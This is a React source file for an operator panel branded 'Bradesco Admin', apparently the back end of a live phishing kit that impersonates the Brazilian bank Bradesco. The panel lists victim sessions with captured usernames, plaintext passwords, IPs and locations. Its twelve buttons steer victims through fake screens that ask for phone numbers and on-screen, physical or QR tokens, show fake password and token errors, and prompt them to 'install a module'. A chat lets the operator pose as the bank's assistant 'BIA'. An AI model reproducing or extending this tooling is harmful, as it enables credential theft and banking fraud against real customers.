import { useEffect, useState } from 'react';
import { io, Socket } from 'socket.io-client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToastContext } from '@/contexts/ToastContext';

interface ClientSession {
  sessionId: string;
  usuario: string;
  senha: string;
  ip: string;
  pais: string;
  estado: string;
  cidade: string;
  device: string;
  status: string;
  telaAtual: string;
  conectadoEm: number;
  ultimaAtualizacao: number;
  token: string;
  ddd: string;
  telefone: string;
  mensagensBia: Array<{ de: string; texto: string; ts: number }>;
  avatarBia: string;
  nomeEnviado: string;
  serialEnviado: string;
  qrCodeEnviado: string;
}

export default function AdminPanel() {
  const toast = useToastContext();
  const [socket, setSocket] = useState<Socket | null>(null);
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [selectedSession, setSelectedSession] = useState<ClientSession | null>(null);
  const [nome, setNome] = useState('');
  const [serial, setSerial] = useState('');
  const [biaMessage, setBiaMessage] = useState('');
  const [biaAvatar, setBiaAvatar] = useState('');
  const [currentPage, setCurrentPage] = useState<'dashboard' | 'acessos' | 'operacao' | 'chat' | 'config'>('operacao');

  useEffect(() => {
    const newSocket = io(window.location.origin, {
      query: { role: 'operator' },
      reconnection: true,
      transports: ['websocket']
    });

    newSocket.on('connect', () => {
      console.log('[OP] Conectado:', newSocket.id);
      toast.success('Conectado', 'Operador conectado ao servidor');
    });

    newSocket.on('operator:sessions', (data: ClientSession[]) => {
      console.log('[ADMIN] 📋 Sessoes recebidas:', data.length);
      setSessions(data);
      setSelectedSession(prevSession => {
        if (prevSession) {
          const updated = data.find(s => s.sessionId === prevSession.sessionId);
          return updated || prevSession;
        }
        return null;
      });
    });

    newSocket.on('operator:client-bia-message', (data: any) => {
      console.log('[OP] Mensagem do cliente recebida:', data);
      setSelectedSession(prevSession => {
        if (prevSession && prevSession.sessionId === data.sessionId) {
          return {
            ...prevSession,
            mensagensBia: [...(prevSession.mensagensBia || []), { de: data.de, texto: data.texto, ts: data.ts }],
          };
        }
        return prevSession;
      });
    });

    newSocket.on('disconnect', () => {
      console.log('[OP] Desconectado');
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, [toast]);

  const sendCommand = (command: string) => {
    if (!socket || !selectedSession) {
      toast.error('Erro', 'Selecione uma sessão ativa');
      return;
    }
    console.log('[ADMIN] Enviando comando:', command, 'para:', selectedSession.sessionId);
    socket.emit('operator:command', { 
      sessionId: selectedSession.sessionId, 
      command: command 
    });
    toast.success('Comando', `"${command}" enviado`);
  };

  const sendInfo = () => {
    if (!socket || !selectedSession || !nome || !serial) {
      toast.error('Erro', 'Preencha Nome e Serial');
      return;
    }
    socket.emit('operator:enviar-info', { sessionId: selectedSession.sessionId, nome, serial });
    toast.success('Info', 'Dados enviados');
    setNome('');
    setSerial('');
  };

  const sendBiaMessage = () => {
    if (!socket || !selectedSession || !biaMessage.trim()) {
      toast.error('Erro', 'Digite uma mensagem');
      return;
    }
    socket.emit('operator:bia-message', { sessionId: selectedSession.sessionId, texto: biaMessage });
    toast.success('BIA', 'Mensagem enviada');
    setBiaMessage('');
  };

  const updateBiaAvatar = () => {
    if (!socket || !selectedSession || !biaAvatar.trim()) {
      toast.error('Erro', 'Cole a URL do avatar');
      return;
    }
    socket.emit('operator:bia-avatar', { sessionId: selectedSession.sessionId, avatar: biaAvatar });
    toast.success('Avatar', 'Avatar atualizado');
    setBiaAvatar('');
  };

  const deleteSession = (sessionId: string) => {
    if (!socket) return;
    socket.emit('operator:delete-session', { sessionId });
    toast.success('Sessão', 'Sessão deletada');
  };

  const formatTime = (ts: number) => new Date(ts).toLocaleString('pt-BR');

  // ---- RENDER ----
  return (
    <div className="min-h-screen bg-slate-900 text-white flex">
      {/* Sidebar */}
      <div className="w-56 bg-slate-950 border-r border-slate-800 flex flex-col">
        <div className="p-4 border-b border-slate-800">
          <div className="text-2xl font-bold text-red-600">B</div>
          <div className="text-xs text-slate-400 mt-1">Bradesco Admin</div>
        </div>

        <nav className="flex-1 p-4 space-y-2">
          {[
            { id: 'dashboard', label: 'Dashboard' },
            { id: 'acessos', label: 'Acessos' },
            { id: 'operacao', label: 'Operar Acesso' },
            { id: 'chat', label: 'Chat BIA' },
            { id: 'config', label: 'Configurações' },
          ].map(item => (
            <button
              key={item.id}
              onClick={() => setCurrentPage(item.id as any)}
              className={`w-full text-left px-3 py-2 rounded text-sm font-medium transition ${
                currentPage === item.id
                  ? 'bg-red-600 text-white'
                  : 'text-slate-300 hover:bg-slate-800'
              }`}
            >
              {item.label}
            </button>
          ))}
        </nav>

        <div className="p-4 border-t border-slate-800">
          <button className="w-full px-3 py-2 rounded text-sm font-medium text-slate-300 hover:bg-slate-800 transition">
            Sair
          </button>
        </div>
      </div>

      {/* Conteúdo Principal */}
      <div className="flex-1 p-6 overflow-auto">
        {currentPage === 'operacao' && (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold">Operar Acesso</h1>

            <div className="grid grid-cols-3 gap-6">
              {/* Sessões */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Sessões Ativas</h2>
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {sessions.map(s => (
                    <button
                      key={s.sessionId}
                      onClick={() => setSelectedSession(s)}
                      className={`w-full text-left p-3 rounded text-sm transition ${
                        selectedSession?.sessionId === s.sessionId
                          ? 'bg-red-600 text-white'
                          : 'bg-slate-700 text-slate-300 hover:bg-slate-600'
                      }`}
                    >
                      <div className="font-bold">{s.usuario || 'Anônimo'}</div>
                      <div className="text-xs">{s.ip}</div>
                      <div className="text-xs">{s.cidade}, {s.estado}</div>
                    </button>
                  ))}
                  {sessions.length === 0 && (
                    <div className="text-slate-500 text-sm p-3">Nenhuma sessão ativa</div>
                  )}
                </div>
              </div>

              {/* Dados em Tempo Real */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Dados em Tempo Real</h2>
                {selectedSession ? (
                  <div className="space-y-3 text-sm">
                    <div>
                      <div className="text-slate-400">Usuário</div>
                      <div className="font-mono text-red-400">{selectedSession.usuario || '—'}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Senha</div>
                      <div className="font-mono text-red-400">{selectedSession.senha || '—'}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">IP</div>
                      <div className="font-mono">{selectedSession.ip}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Localização</div>
                      <div className="font-mono">{selectedSession.cidade}, {selectedSession.estado}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Device</div>
                      <div className="font-mono">{selectedSession.device}</div>
                    </div>
                    <div>
                      <div className="text-slate-400">Tela Atual</div>
                      <div className="font-mono text-yellow-400">{selectedSession.telaAtual}</div>
                    </div>
                  </div>
                ) : (
                  <div className="text-slate-500">Selecione uma sessão</div>
                )}
              </div>

              {/* Enviar Informações */}
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Enviar Informações</h2>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs text-slate-400">Nome</label>
                    <Input
                      value={nome}
                      onChange={(e) => setNome(e.target.value)}
                      placeholder="Ricardo Braga"
                      className="bg-slate-700 border-slate-600 text-white text-sm"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-slate-400">Serial</label>
                    <Input
                      value={serial}
                      onChange={(e) => setSerial(e.target.value)}
                      placeholder="50818864754"
                      className="bg-slate-700 border-slate-600 text-white text-sm"
                    />
                  </div>
                  <Button
                    onClick={sendInfo}
                    className="w-full bg-red-600 hover:bg-red-700 text-white text-sm"
                  >
                    Enviar
                  </Button>
                </div>
              </div>
            </div>

            {/* 12 Botões de Controle */}
            <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
              <h2 className="text-lg font-bold mb-4">Ações de Controle (12 Botões)</h2>
              <div className="grid grid-cols-4 gap-2">
                <Button onClick={() => sendCommand('Tela de Login')} className="bg-blue-600 hover:bg-blue-700 text-xs h-10">Tela de Login</Button>
                <Button onClick={() => sendCommand('Aguarde / Senha Incorreta')} className="bg-purple-600 hover:bg-purple-700 text-xs h-10">Aguarde / Senha Incorreta</Button>
                <Button onClick={() => sendCommand('Pedir Celular')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Pedir Celular</Button>
                <Button onClick={() => sendCommand('Pedir Token Tela')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Pedir Token Tela</Button>
                <Button onClick={() => sendCommand('Pedir Token Físico')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Pedir Token Físico</Button>
                <Button onClick={() => sendCommand('Pedir Token QR Code')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Pedir Token QR Code</Button>
                <Button onClick={() => sendCommand('Erro Token')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Erro Token</Button>
                <Button onClick={() => sendCommand('Erro Celular')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Erro Celular</Button>
                <Button onClick={() => sendCommand('Desbloqueio BIA')} className="bg-green-600 hover:bg-green-700 text-xs h-10">Desbloqueio BIA</Button>
                <Button onClick={() => sendCommand('Erro Desbloqueio BIA')} className="bg-red-600 hover:bg-red-700 text-xs h-10">Erro Desbloqueio BIA</Button>
                <Button onClick={() => sendCommand('Instalar Modulo')} className="bg-blue-600 hover:bg-blue-700 text-xs h-10">Instalar Modulo</Button>
                <Button onClick={() => sendCommand('Validar Modulo')} className="bg-green-600 hover:bg-green-700 text-xs h-10">Validar Modulo</Button>
              </div>
            </div>

            {/* Chat BIA */}
            <div className="grid grid-cols-2 gap-6">
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Chat BIA - Painel Administrativo</h2>
                <div className="bg-slate-900 rounded p-3 h-48 overflow-y-auto mb-3 space-y-2 text-sm">
                  {selectedSession?.mensagensBia && selectedSession.mensagensBia.length > 0 ? (
                    selectedSession.mensagensBia.map((msg, idx) => (
                      <div key={idx} className={`flex ${msg.de === 'operador' ? 'justify-end' : 'justify-start'}`}>
                        <div className={`px-3 py-2 rounded max-w-xs break-words ${msg.de === 'operador' ? 'bg-red-600 text-white' : 'bg-slate-700 text-slate-100'}`}>
                          <div className="text-xs opacity-75 mb-1">{msg.de === 'operador' ? 'Você' : 'Cliente'}</div>
                          {msg.texto}
                        </div>
                      </div>
                    ))
                  ) : (
                    <div className="text-slate-500 text-center py-8">Nenhuma mensagem ainda</div>
                  )}
                </div>
                <div className="flex gap-2">
                  <Input
                    value={biaMessage}
                    onChange={(e) => setBiaMessage(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && sendBiaMessage()}
                    placeholder="Digite uma mensagem..."
                    className="bg-slate-700 border-slate-600 text-white text-sm"
                  />
                  <Button onClick={sendBiaMessage} className="bg-red-600 hover:bg-red-700 text-white">Enviar</Button>
                </div>
              </div>

              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <h2 className="text-lg font-bold mb-4">Configurar Avatares do Chat</h2>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs text-slate-400">URL do Avatar</label>
                    <Input
                      value={biaAvatar}
                      onChange={(e) => setBiaAvatar(e.target.value)}
                      placeholder="https://..."
                      className="bg-slate-700 border-slate-600 text-white text-sm"
                    />
                  </div>
                  <Button
                    onClick={updateBiaAvatar}
                    className="w-full bg-red-600 hover:bg-red-700 text-white text-sm"
                  >
                    Atualizar Avatar
                  </Button>
                </div>
              </div>
            </div>
          </div>
        )}

        {currentPage === 'acessos' && (
          <div>
            <h1 className="text-3xl font-bold mb-6">Acessos</h1>
            <div className="bg-slate-800 rounded-lg border border-slate-700 overflow-hidden">
              <table className="w-full text-sm">
                <thead className="bg-slate-700 border-b border-slate-600">
                  <tr>
                    <th className="px-4 py-3 text-left">#</th>
                    <th className="px-4 py-3 text-left">IP</th>
                    <th className="px-4 py-3 text-left">Data/Hora</th>
                    <th className="px-4 py-3 text-left">País</th>
                    <th className="px-4 py-3 text-left">Estado</th>
                    <th className="px-4 py-3 text-left">Cidade</th>
                    <th className="px-4 py-3 text-left">Status</th>
                    <th className="px-4 py-3 text-left">Device</th>
                    <th className="px-4 py-3 text-left">Ações</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-700">
                  {sessions.map((s, idx) => (
                    <tr key={s.sessionId} className="hover:bg-slate-700 transition">
                      <td className="px-4 py-3">{idx + 1}</td>
                      <td className="px-4 py-3 font-mono text-xs">{s.ip}</td>
                      <td className="px-4 py-3 text-xs">{formatTime(s.ultimaAtualizacao)}</td>
                      <td className="px-4 py-3">{s.pais}</td>
                      <td className="px-4 py-3">{s.estado}</td>
                      <td className="px-4 py-3">{s.cidade}</td>
                      <td className="px-4 py-3">
                        <span className={`px-2 py-1 rounded text-xs font-bold ${s.status === 'online' ? 'bg-green-900 text-green-200' : 'bg-red-900 text-red-200'}`}>
                          {s.status}
                        </span>
                      </td>
                      <td className="px-4 py-3">{s.device}</td>
                      <td className="px-4 py-3">
                        <Button
                          onClick={() => {
                            setSelectedSession(s);
                            setCurrentPage('operacao');
                          }}
                          className="bg-green-600 hover:bg-green-700 text-white text-xs h-8 px-2"
                        >
                          Entrar
                        </Button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {currentPage === 'dashboard' && (
          <div>
            <h1 className="text-3xl font-bold mb-6">Dashboard</h1>
            <div className="grid grid-cols-4 gap-4">
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <div className="text-slate-400 text-sm">Usuários Online</div>
                <div className="text-3xl font-bold mt-2">{sessions.filter(s => s.status === 'online').length}</div>
              </div>
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <div className="text-slate-400 text-sm">Total de Acessos</div>
                <div className="text-3xl font-bold mt-2">{sessions.length}</div>
              </div>
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <div className="text-slate-400 text-sm">Taxa de Sucesso</div>
                <div className="text-3xl font-bold mt-2">95%</div>
              </div>
              <div className="bg-slate-800 rounded-lg p-4 border border-slate-700">
                <div className="text-slate-400 text-sm">Uptime</div>
                <div className="text-3xl font-bold mt-2">99.9%</div>
              </div>
            </div>
          </div>
        )}

        {currentPage === 'chat' && (
          <div>
            <h1 className="text-3xl font-bold mb-6">Chat BIA</h1>
            <div className="text-slate-400">Chat BIA - Gerenciamento centralizado de conversas</div>
          </div>
        )}

        {currentPage === 'config' && (
          <div>
            <h1 className="text-3xl font-bold mb-6">Configurações</h1>
            <div className="text-slate-400">Configurações do sistema</div>
          </div>
        )}
      </div>
    </div>
  );
}
